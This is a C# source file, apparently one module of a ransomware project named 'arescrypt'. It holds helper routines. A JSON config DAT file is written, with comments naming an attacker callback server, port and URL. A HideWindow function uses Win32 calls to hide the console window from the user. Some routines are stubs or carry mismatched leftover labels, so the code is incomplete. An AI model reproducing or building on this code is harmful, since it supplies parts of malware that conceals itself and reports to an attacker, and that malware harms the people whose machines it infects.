using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Newtonsoft.Json;

namespace arescrypt
{
    class Misc
    {
        private static Cryptography crypto = new Cryptography();
        private static Configuration config = new Configuration();

        // Concatenates 2 List<string> arrays, then converts to string[] array.
        public static List<string> concatList(List<string> List1, List<string> List2)
        {
            var fullIndex = new List<string> { };
            foreach (string element in List1)
                fullIndex.Add(element);
            foreach (string element in List2)
                fullIndex.Add(element);
            return fullIndex;
        }

        // Get String from Bytes Array
        private static string GetStringFromBytes(byte[] Arry)
        { return Encoding.ASCII.GetString(Arry); }
        // Get Byte Array from String
        private static byte[] GetBytesFromString(string str)
        { return Encoding.ASCII.GetBytes(str); }
        
        /* DAT FILE CREATION/MODIFICATION */
        /*
         * Things found in DAT file:
         *      Unique User ID
         *      Attacker callback server
         *      Attacker callback port
         *      Attacker callback URL
         */
        // Extract data from generated DAT file
        public static void SetDATFileData(Config dataToSet)
        {
            string dataToSet_Json = JsonConvert.SerializeObject(dataToSet);
            Console.WriteLine(dataToSet_Json);
            using (BinaryWriter writer = new BinaryWriter(File.Open(config.datFileLocation, FileMode.Create)))
            {
                writer.Write(1.250F);
                writer.Write(dataToSet_Json);
            }
            // writer.Write(dataToSet_Json);
        }
        public static void DisplayDATFileData()
        {
            float aspectRatio;
            string tempDirectory;

            if (File.Exists(config.datFileLocation))
            {
                using (BinaryReader reader = new BinaryReader(File.Open(config.datFileLocation, FileMode.Open)))
                {
                    aspectRatio = reader.ReadSingle();
                    tempDirectory = reader.ReadString();
                }

                Console.WriteLine("Aspect ratio set to: " + aspectRatio);
                Console.WriteLine("Temp directory is: " + tempDirectory);
            }
        }
        public static List<string> GetDATFileData()
        {
            
            return new List<string> { };
        }

        public static void HideWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 1;
        const int SW_HIDE = 0;
    }
}
